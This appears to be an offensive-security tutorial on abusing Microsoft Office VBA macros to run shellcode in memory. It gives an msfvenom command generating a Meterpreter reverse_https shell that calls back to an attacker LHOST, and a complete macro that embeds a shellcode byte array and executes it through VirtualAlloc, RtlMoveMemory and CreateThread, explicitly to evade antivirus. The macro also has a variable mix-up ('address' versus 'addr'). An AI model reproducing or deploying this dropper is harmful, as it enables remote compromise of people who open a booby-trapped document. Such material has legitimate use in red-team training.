# Client Side Code Execution with Office
Gaining remote code execution can be done with a variety of methods. One of those methods is taking advantage of vulnerable software running on the endpoint. Though, it is hard to find vulnerabilities since patches are continuously being ruled out, and even if we find a vulnerability we have to develop a working exploit in order to successfully gain a foothold.  

So, to gain remote code execution without relying on software  vulnerabilities we will attempt abuse common features and functionalities provided by software running on the endpoint. Specifically, the goal of this module is to exploit the Microsoft Office suite to execute malicious code.

## The Client-Side Attack Scenario
To initiate a client-side attack, an attacker often delivers a _Trojan_ (for example, in the form of an innocent looking Word or PDF document). Traditional droppers embed an entire payload into the Trojan, but almost all malware families are tending to rely on complex _Droppers_ that use a _staged_ payload that connects back to a C2 to download the second stage.

Once the code has been delivered, it may be written directly to the hard disk or run directly from memory (This is what knows as **In-Memory Execution**).

### Staged vs Non-staged Payload
There are two types of payloads, they are as follows -
- **Non-staged payloads** is a self-contained of code instruction that serve to perform some actions. For example the Metasploit `windows/tcp_reverse_shell` is non-staged payload to open up a reverse command shell and expose to the attacker's machine. This type of payloads are really just fire-and-forget.

- On the other hand, **Staged payloads** allow for reusability using different stages. These payloads contain a minimal amount of code that perform a _callback_, then retrieves the remaining code. This is usually the preferred type for malware developers since it allows for reusability and helps to avoid detection since it is smaller compared to a non-staged payload.

To generate a non-staged payload in Metasploit, we use:
```
windows/x64/meterpreter_reverse_https
```
and to generate a staged payload, 
```
windows/x64/meterpreter/reverse_https
```

**Note**: "`_`" for non-staged, and "`/`" for staged payloads.

### Building our first Dropper


### Running Shellcode
#### Running Shellcode with VBA
##### Introduction to calling Win32 APIs in VBA
Currently, our malicious macro downloads a malicious payload and saves to the hard disk. This, however, raises suspicious and most AVs will flag it. Our goal is to avoid writing to the hard disk. To do this, we will leverage Win32 API calls. These API calls reside with dynamically-linked libraries (DLLs). These are self-contained pieces of code that expose their functionalities (APIs) to other applications.

Let's try and use the `GetUserNameA` API inside VBA. To do this, we need to first get the function signature and C and _translate_ it to a VBA signature.

The `GetUserNameA` API resides within `Advapi32.dll` and its C signature is:
```c
BOOL GetUserNameA(
  LPSTR   lpBuffer,
  LPDWORD pcbBuffer
);
```
To get the translation, we'll use P/Invoke (`www.invoke.net`). A quick google yields the following VBA translation:
```vba
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nMax As Integer) As Boolean
```

The following is an example of using `GetUserNameA` to get the username and print it to the screen:
```vba
' Access the GetUserNameA function in advapi32.dll and
' call the function GetUserName.
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
 
' Main routine to retrieve user name.
Function GetLogonName() As String

    ' Dimension variables
    Dim lpBuff As String * 255
    Dim ret As Long
    
    ' Get the user name minus any trailing spaces found in the name.
    ret = GetUserName(lpBuff, 255)
    
    If ret > 0 Then
        GetLogonName = Left(lpBuff, InStr(lpBuff, Chr(0)) - 1)
    Else
        GetLogonName = vbNullString
    End If
    
    MsgBox ("Curren logged in user: " + GetLogonName)
End Function
```

![Current Logged In user]()
##### Running shellcode in VBA with `CreateThread()`
After reviewing how to invoke Win32 APIs in VBA, we will use to run our shellcode in memory without saving it to hard disk. This is quite helpful for evading detection. The most used APIs to do are `VirtualAlloc` to allocate RWX memory withing, `RtlMoveMemory` to copy the shellcode we previously generated with metasploit and finally running that shellcode with `CreateThread`. Please note that this are not the only ways to do this, there are many other APIs we can use. We will see this later.

Let's generate our tcp reverse shell payload. We will choose `-f vbapplication` to get a VBA-formatted output.
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.9 LPORT=5577 EXITFUNC=thread -f vbapplication
```
![VBA formatted output]()

So this how we are going to run the shellcode in VBA:
1. Create the `buf` variable containing the shellcode
2. Allocate virtual memory with `VirtualAlloc`
3. Copy our shellcode to the allocated memory.
4. Create a thread to run the shellcode with `CreateThread`


```vba
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" _
(ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, _
ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32.dll" _
(ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function MoveMemory Lib "KERNEL32.dll" _
    Alias "RtlMoveMemory" (ByVal dest As LongPtr, ByVal src As LongPtr, ByVal size As Integer)


Function RunShellcode()

  Dim buf as Variant 
  Dim address as LongPtr
  Dim counter as Long
  Dim data as Long
  Dim res as Long


  buf = Array(232,143,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20,15,183,74,38,139,114,40,49,255,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192,116,76,1,208,139,88,32,139,72,24,1,211,80,133,201,116,60,73,139, _
  52,139,1,214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _
  104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,62,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,55,46,48,59,32,114,118,58,49,49,46,48,41,32,108,105,107,101,32,71,101,99,107,111, _
  0,104,58,86,121,167,255,213,83,83,106,3,83,83,104,201,21,0,0,232,29,1,0,0,47,106,109,122,83,100,103,103,114,120,84,56,66,101,81,66,52,89,82,122,103,113,119,67,106,53,99,75,98,111,117,48,113,75,121,106,45,95,116,87,95,88,121,69,114,104,77,83,115,48,100,83,111,69,95,86, _
  81,82,68,80,57,55,119,45,71,113,101,109,117,102,50,53,116,86,105,72,80,106,111,122,122,77,77,97,51,113,65,120,103,105,106,110,107,49,120,113,117,78,72,67,109,70,53,88,98,97,84,88,49,90,95,55,95,100,102,53,77,75,74,49,73,118,85,54,116,109,108,121,56,118,57,74,85,100,122,89, _
  107,95,118,122,54,0,80,104,87,137,159,198,255,213,137,198,83,104,0,50,232,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86,104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0, _
  104,68,240,53,224,255,213,79,117,205,232,70,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,50,55,46,48, _
  46,48,46,49,0,187,224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213)


  address = VirtualAlloc(0, UBound(buf), &H3000, &H40)

  For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = MoveMemory(addr + counter, data, 1)
  Next counter

  res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
```
